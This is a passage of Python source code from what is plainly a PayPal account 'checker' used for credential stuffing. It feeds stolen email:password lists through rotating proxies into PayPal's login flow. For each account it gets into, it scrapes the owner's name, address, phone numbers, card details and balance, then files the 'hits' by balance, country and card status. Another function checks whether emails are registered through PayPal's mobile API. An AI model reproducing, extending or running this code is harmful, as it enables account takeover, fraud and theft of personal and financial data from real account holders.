                    sess.close()
                    continue
                elif 'Found. Redirecting to <a href="https://www.paypal.com/webapps/hermes?flow=1-P&amp;ulReturn=true&amp;token=EC' in r3.text or "Found. Redirecting to" in r3.text or 'Found. Redirecting to <a href="https://www.paypal.com/connect/?client_id=' in r3.text or 'Found. Redirecting to <a href="https://www.paypal.com/webapps/hermes?flow=1-P&amp;ulReturn=true&amp;token=EC' in r3.text:
                    url = "https://www.paypal.com/invoice/s/invoice-model/?template="
                    header = {
                        "accept": "application/json",
                        "accept-encoding": None,
                        "accept-language": "en-US,en;q=0.9",
                        "content-type": "application/json",
                        "referer": "https://www.paypal.com/invoice/s/create",
                        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"",
                        "sec-ch-ua-mobile": "?0",
                        "sec-ch-ua-platform": "\"Windows\"",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-origin",
                        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
                        "x-requested-with": "XMLHttpRequest"
                    }
                    r4 = sess.get(url, headers=header, proxies=proxy_form, verify=False)
                    if "sessionExpired\",\"location\":\"https://www.paypal.com" in r4.text:
                        error+=1
                        sess.close()
                        break
                    country = r4.text[r4.text.find(',"country":"')+len(',"country":"'):r4.text.rfind('","locale":"')]
                    countrycode = r4.text[r4.text.find('"country_code":"')+len('"country_code":"'):r4.text.rfind('"},{')]
                    countrycode = countrycode[:10]
                    countrycode = countrycode[:countrycode.rfind('"},{')]
                    State = r4.text[r4.text.find('","state":"')+len('","state":"'):r4.text.rfind('","city":"')]
                    State = State[:60]
                    State = State[:State.rfind('","city":"')]
                    first_name = r4.text[r4.text.find('{"first_name":"')+len('{"first_name":"'):r4.text.rfind('","last_name":"')]
                    last_name = r4.text[r4.text.find('","last_name":"')+len('","last_name":"'):r4.text.rfind('","line_1":"')]
                    if '","email":"' in last_name:
                        last_name = last_name[:100]
                        last_name = last_name[:last_name.rfind('","email":')]
                    if '","business_name"' in last_name:
                        last_name = last_name[:last_name.rfind('","business_name"')]
                    full_name = f"{first_name} {last_name}"
                    City = r4.text[r4.text.find('","city":"')+len('","city":"'):r4.text.rfind('","postcode":')]
                    City = City[:50]
                    City = City[:City.rfind('","postal_code"')]
                    if '","postcode' in City:
                        City = City[:City.rfind('","postcode"')]
                    adress = r4.text[r4.text.find(',{"line1":"')+len(',{"line1":"'):r4.text.rfind('","line2":"",')]
                    adress = adress[:80]
                    adress = adress[:adress.rfind('","line2":"",')]
                    numbers = r4.text
                    count = numbers.count('"national_number":"')
                    number = ""
                    if count == 0:
                        number = "[No Phones]"
                    else:
                        while True:
                            if count <= 0:
                                number = f"[{number}]"
                                break
                            number1 = numbers[numbers.find('"national_number":"')+len('"national_number":"'):numbers.rfind('","phone_type"')]
                            number1 = number1[:40]
                            number1 = number1[:number1.rfind('","phone_type"')]
                            if '","label":"' in number1:
                                number1 = number1[:number1.rfind('","label":"')]
                            numbers.replace(f'"national_number":"', '')
                            if count >= 2:
                                number = f"{number}+{countrycode}{number1}, "
                            else:
                                number = f"{number}+{countrycode}{number1}"
                            a = 1
                            count = count - a
                    if '","line2' in adress:
                        adress = adress[:adress.rfind('","line2":"')]
                    url = "https://www.paypal.com/myaccount/money/"
                    header = {
                        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/2.3.0 Mobile/15E148",
                        "Pragma": "no-cache",
                        "Accept": None,
                        "Host": "www.paypal.com",
                        "Accept-Language": "en-CA,en-US;q=0.7,en;q=0.3",
                        "Accept-Encoding": None,
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Origin": "https://www.paypal.com",
                        "Connection": "keep-alive",
                        "Upgrade-Insecure-Requests": "1",
                        "Cache-Control": "no-cache"
                    }
                    r5 = sess.get(url, headers=header, verify=False)
                    cards = r5.text
                    count = cards.count('"lastDigits":"')
                    Card = ""
                    if count <= 0:
                        Card = "No Cards | "
                    else:
                        while True:
                            if count == 0:
                                Card = Card[:-2]
                                Card = f"{Card} | "
                                break
                            expired = False
                            Card1 = cards[cards.find('"lastDigits":"')+len('"lastDigits":"'):cards.rfind('","productClass":"')]
                            Card1 = Card1[:40]
                            if "productClass" in Card1:
                                Card1 = Card1[:Card1.rfind('","productClass":"')]
                            if ',"bankName":"' in Card1:
                                Card1 = Card1[:Card1.rfind('","bankName":"')]
                                Card2 = cards[cards.find(f',"lastDigits":"{Card1}","bankName":"')+len(f',"lastDigits":"{Card1}","bankName":"'):cards.rfind('","countryCode":"')]
                                Card2 = Card2[:40]
                                if "countryCode" in Card2:
                                    Card2 = Card2[:Card2.rfind('","countryCode')]
                                cards = cards.replace(f',"lastDigits":"{Card1}","bankName":"{Card2}', '')
                            else:
                                Card2 = cards[cards.find(f',"lastDigits":"{Card1}","productClass":"')+len(f',"lastDigits":"{Card1}","productClass":"'):cards.rfind('","riskState":"')]
                                Card2 = Card2[:80]
                                if "riskState" in Card2:
                                    Card2 = Card2[:Card2.rfind('","riskState"')]
                                if 'countryCode"' in Card2:
                                    Card2 = Card2[:Card2.rfind('","countryCode')]
                                Card3 = cards[:cards.rfind(f'","lastDigits":"{Card1}","productClass":')]
                                Card3 = Card3[1 - 200:]
                                CardYear = Card3[Card3.find('"expYear":')+len('"expYear":'):Card3.rfind(f',"expMonthName":"')]
                                CardMonth = Card3[Card3.find('","expMonthDigit":"')+len(f'","expMonthDigit":"'):]
                                if int(CardYear) <= 2021:
                                    expired = True
                                elif int(CardYear) == 2022:
                                    if int(CardMonth) <= datetime.now().month:
                                        expired = True
                                cards = cards.replace(f'","lastDigits":"{Card1}","productClass":"', '')
                            if expired:
                                Card = f"{Card}[EXPIRED: {Card1}], "    
                            else:
                                Card = f"{Card}[Last Digits: {Card1} Type: {Card2}], "
                            a = 1
                            count = count - a
                    Balance = r5.text[r5.text.find('"totalAvailable":{"amount":"')+len('"totalAvailable":{"amount":"'):r5.text.rfind('","currency":"')]
                    Balance = Balance[:60]
                    Balance = Balance[:Balance.rfind('","currency":"')]
                    if "><" in Balance:
                        Balance = "0.000"
                    if not "Type:" in Card:
                        data = f"Full Name: {full_name} | City: {City} | State: {State} | Address: {adress} | Country: {country} | Phone: {number} | Cards: {Card}Balance: [{Balance}$]"
                        a = open(f'results/Paypal #1/{current_date}/Hits Expired.txt', 'a', encoding='utf-8').write(f"{accounts} | {data}\n")
                        expires+=1
                        checked+=1
                        cpm+=1
                        PrintExpires(email, password, data)
                        sess.close()
                        break
                    if float(Balance) > 0:
                        wbalance+=1
                        good = f"{email}:{password} | Full Name: {full_name} | City: {City} | State: {State} | Address: {adress} | Country: {country} | Phone: {number} | Cards: {Card}Balance: [{Balance}$]\n"
                        a = open(f'results/Paypal #1/{current_date}/Hits with balance.txt', 'a', encoding='utf-8').write(good)
                        if float(Balance) < 10:
                            b0to10+=1
                            a = open(f'results/Paypal #1/{current_date}/Short by balance/Below 10$ in balance.txt', 'a', encoding='utf-8').write(good)
                        elif float(Balance) < 50.0:
                            b10to50+=1
                            a = open(f'results/Paypal #1/{current_date}/Short by balance/Below 50$ in balance.txt', 'a', encoding='utf-8').write(good)
                        elif float(Balance) < 100.0:
                            b50to100+=1
                            a = open(f'results/Paypal #1/{current_date}/Short by balance/Below 100$ in balance.txt', 'a', encoding='utf-8').write(good)
                        elif float(Balance) < 500.0:
                            b100to500+=1
                            a = open(f'results/Paypal #1/{current_date}/Short by balance/Below 500$ in balance.txt', 'a', encoding='utf-8').write(good)
                        elif float(Balance) < 1000.0:
                            b500to1000+=1
                            a = open(f'results/Paypal #1/{current_date}/Short by balance/Below 1000$ in balance.txt', 'a', encoding='utf-8').write(good)
                        elif float(Balance) > 1000.0:
                            b1000more+=1
                            a = open(f'results/Paypal #1/{current_date}/Short by balance/Up 1000$ in balance.txt', 'a', encoding='utf-8').write(good)
                    if "No Cards" in Card:
                        nocard+=1
                        good = f"{email}:{password} | Full Name: {full_name} | City: {City} | State: {State} | Address: {adress} | Country: {country} | Phone: {number} | Cards: {Card}Balance: [{Balance}$]\n"
                        a = open(f'results/Paypal #1/{current_date}/Hits without CreditCard.txt', 'a', encoding='utf-8').write(good)
                        a = open(f'results/Paypal #1/{current_date}/Short by country/Hits from {country} (no cc).txt', 'a', encoding='utf-8').write(good)
                    else:
                        yescard+=1
                        good = f"{email}:{password} | Full Name: {full_name} | City: {City} | State: {State} | Address: {adress} | Country: {country} | Phone: {number} | Cards: {Card}Balance: [{Balance}$]\n"
                        a = open(f'results/Paypal #1/{current_date}/Hits with CreditCard.txt', 'a', encoding='utf-8').write(good)
                        a = open(f'results/Paypal #1/{current_date}/Short by country/Hits from {country} (with cc).txt', 'a', encoding='utf-8').write(good)
                    hits+=1
                    data = f"Full Name: {full_name} | City: {City} | State: {State} | Address: {adress} | Country: {country} | Phone: {number} | Cards: {Card}Balance: [{Balance}$]"
                    PrintHits(email, password, data)
                    checked+=1
                    cpm+=1
                    cpmcount()
                    ActualizePaypalCap1()
                    good = f"{email}:{password} | Full Name: {full_name} | City: {City} | State: {State} | Address: {adress} | Country: {country} | Phone: {number} | Cards: {Card}Balance: [{Balance}$]\n"
                    a = open(f'results/Paypal #1/{current_date}/Hits.txt', 'a', encoding='utf-8').write(good)
                    sess.close()
                    break
                else:
                    a = open(f'results/log33.txt', 'a', encoding='utf-8').write(f"Erorr: 103 [Normal]\n")
                    error+=1
                    sess.close()
                    continue
            except Exception as e:
                e = str(e).replace("xsolla","").replace("paystation2/api/directpayment?pid=24", "ps").replace("/checkoutnow?token=", "token r2").replace("/pages/redirect?sign=", "pagesredirect")
                a = open(f'results/log.txt', 'a', encoding='utf-8').write(f"{e}\n")
                error+=1
                sess.close()
                continue
def PaypalNoCap1(accounts):
    global hits, bads, free, checked, error, cpm, num2, flagged, wbalance, b0to10, b10to50, b50to100, b100to500, b500to1000, b1000more, nocard, yescard
    recapretrys = 0
    elseretrys = 0
    sess = requests.session()
    global proxylist, retry
    threads, proxy_type, GUIShowInvalids, GUICensure=load_params()
    Check = True
    try:
        email = accounts.split(":")[0]
        password = accounts.split(":")[1]
    except Exception as e:
        print("Error parsing email or password")
        bads+=1
        checked+=1
        Check = False
    if Check:
        while True:
            try:
                threads, proxy_type, GUIShowInvalids, GUICensure=load_params()
                if proxy_type == "http":
                    scheme = "http"
                elif proxy_type == "socks4":
                    scheme = "socks4"
                elif proxy_type == "socks5":
                    scheme = "socks5"
                if not "null" in proxy_type:
                    proxy = random.choice(proxylist)
                    count = proxy.count(":")
                    if count == 3:
                        ip = proxy.split(":")[0]
                        port = proxy.split(":")[1]
                        user = proxy.split(":")[2]
                        passw = proxy.split(":")[3]
                        proxy = f"{user}:{passw}@{ip}:{port}"
                    proxy_form = {'http': f"{scheme}://{proxy}", 'https': f"{scheme}://{proxy}"}
                else:
                    pass
                sess.cookies.clear()
                url = "https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=3P72YXRXHKAYL"
                header = {
                    "accept": None,
                    "accept-encoding": None,
                    "accept-language": "en-US;q=0.8",
                    "sec-fetch-dest": "document",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": "none",
                    "sec-fetch-user": "?1",
                    "sec-gpc": "1",
                    "upgrade-insecure-requests": "1",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36"
                }
                r1 = sess.get(url, headers=header, allow_redirects=False, proxies=proxy_form)
                if "Security Challenge" in r1.text:
                    error+=1
                    sess.close()
                    continue
                one = r1.text[r1.text.find("Found. Redirecting to ")+len("Found. Redirecting to "):r1.text.rfind("")]
                cookies = {
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "en-US;q=0.8",
                    "sec-fetch-dest": "document",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": "none",
                    "sec-fetch-user": "?1",
                    "sec-gpc": "1",
                    "upgrade-insecure-requests": "1",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36"
                }
                header = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
                }
                try:
                    r2 = sess.get(one, headers=header, cookies=cookies, proxies=proxy_form)
                except:
                    one = r1.text[r1.text.find("<p>Found. Redirecting to <a href=\"")+len("<p>Found. Redirecting to <a href=\""):r1.text.rfind("\">")]
                    try:
                        r2 = sess.get(one, headers=header, cookies=cookies, proxies=proxy_form)
                    except:
                        sess.close()
                        error+=1
                        continue
                two = r2.text[r2.text.find("Please login with your email and password.</p></div><form action=\"")+len("Please login with your email and password.</p></div><form action=\""):r2.text.rfind("\" method=\"post\" class=\"proceed")]
                csrf = r2.text[r2.text.find("name=\"_csrf\" value=\"")+len("name=\"_csrf\" value=\""):r2.text.rfind("\"><input type=\"hidden\" id=\"sessi")]
                csrf = urllib.parse.quote(csrf)
                sessid = r2.text[r2.text.find("name=\"_sessionID\" value=\"")+len("name=\"_sessionID\" value=\""):r2.text.rfind("\"><input type=\"hidden\" name=\"loca")]
                sessid = urllib.parse.quote(sessid)
                flowId = r2.text[r2.text.find("name=\"flowId\" value=\"")+len("name=\"flowId\" value=\""):r2.text.rfind("\" /><input type=\"hidden\" name=\"ads-clien")]
                five = r2.text[r2.text.find("name=\"ads-client-context-data\" value=\"")+len("name=\"ads-client-context-data\" value=\""):r2.text.rfind("\" /><input type=\"hidden\" name=\"ctxI")]
                ADS = urllib.parse.quote(five)
                CTXID = r2.text[r2.text.find("name=\"ctxId\" value=\"")+len("name=\"ctxId\" value=\""):r2.text.rfind("\" /><input type=\"hidden\" name=\"isValidCtx")]

                url = f"https://www.paypal.com{two}"
                content = f"_csrf={csrf}&_sessionID={sessid}&locale.x=en_US&processSignin=main&fn_sync_data=%257B%2522SC_VERSION%2522%253A%25222.0.1%2522%252C%2522syncStatus%2522%253A%2522data%2522%252C%2522f%2522%253A%252248130089DF483912L%2522%252C%2522s%2522%253A%2522UL_CHECKOUT_INPUT_PASSWORD%2522%252C%2522chk%2522%253A%257B%2522ts%2522%253A1660696220714%252C%2522eteid%2522%253A%255B615548825%252C10778893016%252C-6101773660%252C536588762%252C-164042729%252C9228186313%252Cnull%252Cnull%255D%252C%2522tts%2522%253A628%257D%252C%2522dc%2522%253A%2522%257B%255C%2522screen%255C%2522%253A%257B%255C%2522colorDepth%255C%2522%253A24%252C%255C%2522pixelDepth%255C%2522%253A24%252C%255C%2522height%255C%2522%253A1024%252C%255C%2522width%255C%2522%253A1280%252C%255C%2522availHeight%255C%2522%253A984%252C%255C%2522availWidth%255C%2522%253A1280%257D%252C%255C%2522ua%255C%2522%253A%255C%2522Mozilla%252F5.0%2520%28Windows%2520NT%252010.0%253B%2520WOW64%29%2520AppleWebKit%252F537.36%2520%28KHTML%252C%2520like%2520Gecko%29%2520Chrome%252F104.0.5112.81%2520Safari%252F537.36%255C%2522%257D%2522%252C%2522d%2522%253A%257B%2522ts2%2522%253A%2522Di0%253A129763Di1%253A181Ui0%253A65Di2%253A208Ui1%253A32Di3%253A256Ui2%253A79Ui3%253A17Di4%253A71Di5%253A96Uh%253A4299%2522%252C%2522rDT%2522%253A%252226193%252C25876%252C25622%253A10823%252C10512%252C10253%253A46682%252C46375%252C46144%253A10814%252C10514%252C10247%253A15928%252C15635%252C15400%253A36416%252C36125%252C35862%253A21045%252C20755%252C20496%253A5673%252C5385%252C5135%253A46654%252C46369%252C46117%253A31280%252C31000%252C30746%253A5660%252C5384%252C5130%253A31270%252C30999%252C30746%253A21016%252C20753%252C20502%253A36377%252C36122%252C35869%253A26121%252C25876%252C25623%253A15864%252C15630%252C15378%253A41467%252C41245%252C40991%253A36333%252C36122%252C35873%253A15830%252C15630%252C15374%253A31189%252C30999%252C30747%253A18156%252C30%2522%257D%257D&otpMayflyKey=40e548d421ef46bea0199bb9a5187bd0otpChlg&intent=checkout&ads-client-context=checkout&flowId={flowId}&ads-client-context-data={ADS}&ctxId={CTXID}&isValidCtxId=true&coBrand=za&signUpEndPoint=%2Fwebapps%2Fmpp%2Faccount-selection&showCountryDropDown=true&hideOtpLoginCredentials=true&requestUrl=%2Fsignin%3Fintent%3Dcheckout%26ctxId%3Dxo_ctx_48130089DF483912L%26returnUri%3D%252Fwebapps%252Fhermes%26state%3D%253Fflow%253D1-P%2526ulReturn%253Dtrue%2526token%253D48130089DF483912L%2526useraction%253Dcommit%2526mfid%253D1660696218785_f5542781740d0%2526rcache%253D1%2526cookieBannerVariant%253D1%2526targetService4174%253Dhermesnodeweb%26locale.x%3Den_US%26country.x%3DUS%26flowId%3D48130089DF483912L&forcePhonePasswordOptIn=&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26token%3D48130089DF483912L%26useraction%3Dcommit%26mfid%3D1660696218785_f5542781740d0%26rcache%3D1%26cookieBannerVariant%3D1%26targetService4174%3Dhermesnodeweb&phoneCode=US+%2B1&login_email={email}&login_password={password}&splitLoginContext=inputPassword&isCookiedHybridEmail=true&partyIdHash=a2edf8a1745debf0987dd46523aa873c6254804d60ca0f7e68013082db4abf4f"
                header = {
                    "accept": None,
                    "accept-encoding": None,
                    "accept-language": "en-US;q=0.8",
                    "cache-control": "max-age=0",
                    "content-length": str(len(content)),
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://www.paypal.com",
                    "referer": "https://www.paypal.com/webapps/hermes?token=48130089DF483912L&useraction=commit&mfid=1660696218785_f5542781740d0",
                    "sec-fetch-dest": "document",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-user": "?1",
                    "sec-gpc": "1",
                    "upgrade-insecure-requests": "1",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
                }
                r3 = sess.post(url, headers=header, data=content, allow_redirects=False, proxies=proxy_form)
                if "Some of your info didn't match" in r3.text or "LoginFailed" in r3.text or "For security reasons, you’ll need" in r3.text:
                    bads+=1
                    checked+=1
                    cpm+=1
                    open(f'results/Paypal #1/{current_date}/Bads.txt', 'a', encoding='utf-8').write("{}\n".format(accounts))
                    sess.close()
                    cpmcount()
                    ActualizePaypalCap1()
                    break
                elif "Redirecting to <a href=\"/authflow/safe/" in r3.text or "to <a href=\"https://www.paypal.com/authflow/twofactor" in r3.text or "Redirecting to <a href=\"/auth/stepup" in r3.text or "entry" in r3.text:
                    free+=1
                    checked+=1
                    cpm+=1
                    sess.close()
                    cpmcount()
                    ActualizePaypalCap1()
                    custom = email + ":" + password
                    a = open(f'results/Paypal #1/{current_date}/2FA.txt', 'a', encoding='utf-8')
                    a.write("{}\n".format(custom))
                    a.close()
                    break
                elif "sessionExpired\",\"location\":\"https://www.paypal.com" in r3.text or "We're sorry, we're having some trouble completing " in r3.text or "CSRF token mismatch" in r3.text or "data-app=\"authchallenge_response\" data-captcha-type=\"recaptcha\"" in r3.text:
                    error+=1
                    sess.close()
                    continue
                elif "Found. Redirecting to <a href=\"https://www.paypal.com/webapps/hermes?flow=1-P&amp;ulReturn=true&amp;token=EC" in r3.text or "Found. Redirecting to" in r3.text:
                    url = "https://www.paypal.com/invoice/s/invoice-model/?template="
                    header = {
                        "accept": "application/json",
                        "accept-encoding": None,
                        "accept-language": "en-US,en;q=0.9",
                        "content-type": "application/json",
                        "referer": "https://www.paypal.com/invoice/s/create",
                        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"",
                        "sec-ch-ua-mobile": "?0",
                        "sec-ch-ua-platform": "\"Windows\"",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-origin",
                        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
                        "x-requested-with": "XMLHttpRequest"
                    }
                    r4 = sess.get(url, headers=header, proxies=proxy_form)
                    if "sessionExpired\",\"location\":\"https://www.paypal.com" in r4.text:
                        error+=1
                        sess.close()
                        break
                    hits+=1
                    checked+=1
                    cpm+=1
                    cpmcount()
                    ActualizePaypalCap1()
                    good = f"{email}:{password}"
                    a = open(f'results/Paypal #1/{current_date}/Hits.txt', 'a', encoding='utf-8').write(good)
                    sess.close()
                    break
                else:
                    error+=1
                    sess.close()
                    continue
            except Exception as e:
                error+=1
                sess.close()
                ##actualizeY2()
                continue


def PaypalVM(accounts):
    global hits, bads, free, checked, error, cpm, num2
    sess = requests.Session()
    global proxylist, retry
    threads, proxy_type, GUIShowInvalids, GUICensure=load_params()
    try:
        email = accounts.split(":")[0]
        password = accounts.split(":")[1]
    except Exception as e:
        print("Error parsing email or password")
        #open("log.txt", 'a+').write("{}\n".format(e))
        bads+=1
        checked+=1
    #PROXY = "11.456.448.110:8080"
    while True:
        try:
            threads, proxy_type, GUIShowInvalids, GUICensure=load_params()
            if proxy_type == "http":
                scheme = "http"
            elif proxy_type == "socks4":
                scheme = "socks4"
            elif proxy_type == "socks5":
                scheme = "socks5"
            if not "null" in proxy_type:
                proxy = random.choice(proxylist)
                count = proxy.count(":")
                if count == 3:
                    ip = proxy.split(":")[0]
                    port = proxy.split(":")[1]
                    user = proxy.split(":")[2]
                    passw = proxy.split(":")[3]
                    proxy = f"{user}:{passw}@{ip}:{port}"
                proxy_form = {'http': f"{scheme}://{proxy}", 'https': f"{scheme}://{proxy}"}
            else:
                pass
            url = "https://api-m.paypal.com/v1/mfsonboardingserv/user/verification/email"
            content = {"flowId":"Onboarding","riskData":"{\"is_emulator\":false,\"device_uptime\":,\"ip_addrs\":\"\",\"risk_comp_session_id\":\"\",\"device_model\":\"iPhone\",\"linker_id\":\"\",\"app_version\":\"7.42.3\",\"os_type\":\"iOS\",\"location_auth_status\":\"unknown\",\"is_rooted\":false,\"ds\":true,\"TouchIDEnrolled\":\"false\",\"app_id\":\"com.yourcompany.PPClient\",\"proxy_setting\":\"host=,port=,type=\",\"conf_url\":\"https:\\\/\\\/www.paypalobjects.com\\\/rdaAssets\\\/magnes\\\/magnes_ios_rec.json\",\"payload_type\":\"full\",\"rf\":\"0000\",\"app_guid\":\"\",\"email_configured\":true,\"tz_name\":\"Europe\\\/\",\"locale_lang\":\"en\",\"bindSchemeAvailable\":\"crypto:kmli,biometric:faceid\",\"cloud_identifier\":\"\",\"total_storage_space\":127933894656,\"tz\":7200000,\"locale_country\":\"\",\"pairing_id\":\"\",\"dbg\":false,\"c\":95,\"sr\":{\"gy\":true,\"mg\":true,\"ac\":true},\"vendor_identifier\":\"\",\"t\":false,\"TouchIDAvailable\":\"true\",\"dc_id\":\"\",\"device_name\":\"\",\"magnes_source\":10,\"pin_lock_last_timestamp\":,\"local_identifier\":\"\",\"os_version\":\"14.6\",\"timestamp\":1626436936905,\"source_app_version\":\"7.42.3\",\"conn_type\":\"wifi\",\"PasscodeSet\":\"true\",\"magnes_guid\":{\"created_at\":1594847338188,\"id\":\"\"},\"conf_version\":\"1.0\",\"ip_addresses\":[\"\"],\"bindSchemeEnrolled\":\"none\",\"mg_id\":\"\",\"comp_version\":\"5.2.0\",\"sms_enabled\":true}","appInfo":"{\"device_app_id\":\"com.yourcompany.PPClient\",\"client_platform\":\"Apple\",\"app_version\":\"7.42.3\",\"app_category\":3,\"app_guid\":\"\",\"push_notification_id\":\"disabled\"}","emailId":email,"firstPartyClientId":"","deviceInfo":"{\"device_identifier\":\"\",\"device_name\":\"\",\"device_type\":\"iOS\",\"device_key_type\":\"APPLE_PHONE\",\"device_model\":\"iPhone\",\"device_os\":\"iOS\",\"device_os_version\":\"14.6\",\"is_device_simulator\":false,\"pp_app_id\":\"\"}","redirectUri":"urn:ietf:wg:oauth:2.0:oob"}
            header = {
                "Host": "api-m.paypal.com",
                "paypal-client-metadata-id": "b27792a1676f4355b929503a6e5dabf2",
                "Accept": "application/json",
                "X-PayPal-ConsumerApp-Context": "%7B%22deviceLocationCountry%22%3A%22DZ%22%2C%22deviceLocale%22%3A%22en_DZ%22%2C%22deviceOSVersion%22%3A%2214.0.1%22%2C%22deviceLanguage%22%3A%22en-DZ%22%2C%22appGuid%22%3A%22085E29B9-325D-430B-9004-3BE6E4D3B833%22%2C%22deviceId%22%3A%220629A0AB-9072-4D4D-A66F-49E49BCC187C%22%2C%22deviceType%22%3A%22iOS%22%2C%22deviceNetworkCarrier%22%3A%22Unknown%22%2C%22deviceModel%22%3A%22iPhone%22%2C%22appName%22%3A%22com.yourcompany.PPClient%22%2C%22deviceOS%22%3A%22iOS%22%2C%22visitorId%22%3A%22085E29B9-325D-430B-9004-3BE6E4D3B833%22%2C%22deviceNetworkType%22%3A%22Unknown%22%2C%22usageTrackerSessionId%22%3A%22FA56BAC6-2157-47BF-817C-87D2880DDEF8%22%2C%22appVersion%22%3A%228.4.3%22%2C%22sdkVersion%22%3A%221.0.0%22%2C%22deviceMake%22%3A%22Apple%22%2C%22riskVisitorId%22%3A%22oZN2bYdCd8cKU_1hHi0in7L5gf_txMCZaHuuydJyVbCrTHZKbIZqjldBY9RRBLZxWbL_spHqm8_c9-Oy%22%7D",
                "Authorization": "Basic QVY4aGRCQk04MHhsZ0tzRC1PYU9ReGVlSFhKbFpsYUN2WFdnVnB2VXFaTVRkVFh5OXBtZkVYdEUxbENxOg==",
                "X-PAYPAL-FPTI": "{\"user_guid\":\"085E29B9-325D-430B-9004-3BE6E4D3B833\",\"user_session_guid\":\"FA56BAC6-2157-47BF-817C-87D2880DDEF8\"}",
                "Accept-Language": "en-us",
                "Accept-Encoding": None,
                "Content-Type": "application/json",
                "Content-Length": "3319",
                "x-paypal-mobileapp": "dmz-access-header",
                "User-Agent": "PayPal/77 (iPhone; iOS 14.0.1; Scale/2.00)",
                "Connection": "keep-alive",
                "paypal-request-id": "644a3d46b10f4fb9b83e87969b8f3b7b"
            }
            r1 = sess.post(url, headers=header, json=content, proxies=proxy_form)
            if "This email already exists with PayPal" in r1.text:
                hits+=1
                checked+=1
                cpm+=1
                sess.close()
                cpmcount()
                ActualizePaypalCap1()
                good = email + ":" + password
                open('results/PaypalVM/{}/Hits.txt'.format(current_date), 'a').write(f"{good}\n")
                break
            elif "\"status\":\"Failure" in r1.text:
                checked+=1
                cpm+=1
                bads+=1
                sess.close()
                cpmcount()
                ActualizePaypalCap1()
                break
            elif "RATE_LIMIT_REACHED" in r1.text or "403 Forbidden" in r1.text:
                error+=1
                sess.close()
                continue
            else:
                error+=1
                sess.close()
                continue
        except Exception as e:
            error+=1
            sess.close()
            continue
    sess.close()



def actualizesess():
    threads, proxy_type, GUIShowInvalids, GUICensure=load_params()
    sess = requests.session()
    while True:
        try:
            global ppsessid, ppaccestoken
            global proxylist, retry
            if proxy_type == "http":
                scheme = "http"
            elif proxy_type == "socks4":
                scheme = "socks4"
            elif proxy_type == "socks5":
                scheme = "socks5"
            if not "null" in proxy_type:
                proxy = random.choice(proxylist)
                count = proxy.count(":")
                if count == 3:
                    ip = proxy.split(":")[0]
                    port = proxy.split(":")[1]
                    user = proxy.split(":")[2]
                    passw = proxy.split(":")[3]
                    proxy = f"{user}:{passw}@{ip}:{port}"
                proxy_form = {'http': f"{scheme}://{proxy}", 'https': f"{scheme}://{proxy}"}
            else:
                pass
            url = "https://livedemo.xsolla.com/paystation-new/token.php?locale=en&sandbox=0"
            header = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Accept-Language": "en-US;q=0.5,en;q=0.3",
                "Accept-Encoding": None,
                "X-Requested-With": "XMLHttpRequest",
                "Connection": "keep-alive",
                "Referer": "https://livedemo.xsolla.com/paystation-new/",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin"
            }
            r = sess.get(url, headers=header, proxies=proxy_form)
            token = r.json().get("token")
            url = f"https://secure.xsolla.com/paystation3/?access_token={token}"
            header = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US;q=0.5,en;q=0.3",
                "Referer": "https://livedemo.xsolla.com/",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "iframe",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-site",
                "Accept-Encoding": None
            }
            r = sess.get(url, headers=header, proxies=proxy_form)
            sessid = r.text[r.text.find('","session_id":"')+len('","session_id":"'):r.text.rfind('","refund_policy":"')]
            sessid = sessid[:300]
            sessid = sessid[:sessid.rfind('","refund_policy":"')]
            ppaccestoken = token 
            ppsessid = sessid
            time.sleep(180)
        except Exception as e:
            print(f"error 1: {e}")
            continue


def PrintHits(email, password, data):
    threads, proxy_type, GUIShowInvalids, GUICensure=load_params()
    if "GUICensure" == "ON":
        password = '*'*len(password)
